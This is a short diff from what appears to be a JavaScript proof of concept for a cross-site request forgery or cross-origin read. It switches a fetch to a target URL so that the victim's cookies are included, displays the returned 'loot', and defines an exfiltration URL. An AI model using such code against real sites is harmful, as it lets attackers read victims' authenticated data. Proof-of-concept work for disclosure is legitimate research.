@@ -13,7 +13,7 @@ const EXFIL_URL  = "https://rytchoo.github.io/csrf-poc/"; // optional
     // credentials: "include" ensures cookies / HTTP auth ride along
     //const res  = await fetch(TARGET_URL, { credentials: "include" });
     //const text = await res.text();
-    fetch(TARGET_URL, { credentials: "omit" })
+    fetch(TARGET_URL, { credentials: "include" })
   .then(r => r.text()).then(t => out.textContent = t);
 
     // Show the loot for screenshots
